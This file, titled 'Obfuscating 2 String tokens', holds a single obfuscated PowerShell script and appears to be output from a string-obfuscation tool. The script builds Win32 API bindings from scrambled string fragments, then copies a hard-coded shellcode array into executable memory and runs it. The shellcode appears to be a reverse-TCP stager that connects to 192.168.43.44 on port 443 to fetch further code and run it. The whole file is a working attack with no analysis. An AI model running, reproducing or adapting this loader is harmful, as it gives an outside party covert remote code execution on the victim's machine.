# Obfuscating 2 String tokens

$c = ((("{95}{106}{64}{92}{90}{99}{93}{107}{37}{4}{85}{5}{74}{19}{22}{68}{102}{87}{38}{18}{91}{110}{78}{65}{41}{51}{98}{40}{35}{66}{60}{58}{79}{49}{105}{29}{12}{25}{23}{86}{84}{46}{94}{28}{9}{82}{100}{70}{31}{56}{0}{8}{33}{20}{1}{108}{6}{96}{59}{61}{39}{73}{52}{14}{11}{76}{21}{47}{103}{32}{7}{30}{88}{89}{67}{57}{71}{80}{45}{75}{104}{109}{10}{69}{62}{77}{15}{101}{44}{54}{16}{24}{42}{50}{48}{13}{3}{81}{34}{63}{27}{111}{36}{53}{17}{26}{97}{43}{83}{72}{2}{55}" -f'hr',', uin',')','tP','ic static ex','Ptr',' dwSt',' d','eadAtt','ntP','I','r','c st','rn In','ta','d','c',' src,','n','Vir','tes','IntPt','tualA',' extern ',' s','atic',' u','m','eThread(I','2.dllvtG)]publi','wCrea','p','nt','ribu',' m','t','t(IntPt',')]publ','ui','ize','Pro','u','t','co','bl',')','P','r lpPara','e','el','atic ext','in','S','r dest, uint','i',';','T','ntPtr l','port(vtG','c','Im','kS','ort(vtGms','e','port(vtGker','onType, ','ect);[Dll','I','lloc(IntPtr lp','mp','l','pThre','nt',', IntPtr lp',' ',';[D','tAddress, ','vcrt.','uint flAllocati','kern','adId','tr','tr','u','nt','tern Int','I',', ','tio','nFlags, ','el','t dwS','n','l','tr Creat','[Dl','a','int ','t fl','32.d',' ','llvtG)]pu','Address','meter, ui','l','3','lIm','lvtG','t','l','ize, ','se')).REPLacE('vtG',[StriNg][chAR]34));$w = Add-Type -memberDefinition $c -Name ("{1}{0}" -f'n32','Wi') -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x2b,0x2c,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};